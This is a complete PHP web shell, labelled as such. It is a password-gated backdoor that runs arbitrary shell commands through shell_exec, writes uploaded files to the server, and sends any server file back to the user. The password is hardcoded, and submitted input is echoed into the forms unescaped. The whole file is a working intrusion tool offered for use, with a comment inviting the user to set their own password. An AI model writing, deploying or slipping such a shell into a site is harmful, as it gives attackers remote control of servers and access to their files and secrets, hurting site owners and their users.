<?php

// PHP Web Shell

// Password protection
$password = 'securepass'; // Change this to your desired password

// Authentication check
if (isset($_POST['password']) && $_POST['password'] === $password) {
    
    // Command execution feature
    if (isset($_POST['cmd'])) {
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }

    // File upload feature
    if (isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "File uploaded successfully!";
    }

    // File download feature
    if (isset($_POST['download'])) {
        $file = $_POST['download'];
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            flush();
            readfile($file);
            exit;
        } else {
            echo "File not found!";
        }
    }
    
} else {
    // If password is incorrect or not entered, show login form
    echo '<form method="POST">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Login">
          </form>';
}

// Error message for incorrect password
if (isset($_POST['password']) && $_POST['password'] !== $password) {
    echo 'Invalid password!';
}
?>

<!-- Command execution form -->
<form method="POST">
    <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>

<!-- File upload form -->
<form method="POST" enctype="multipart/form-data">
    <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
    <input type="file" name="file">
    <input type="submit" value="Upload File">
</form>

<!-- File download form -->
<form method="POST">
    <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
    <input type="text" name="download" placeholder="File to download">
    <input type="submit" value="Download">
</form>
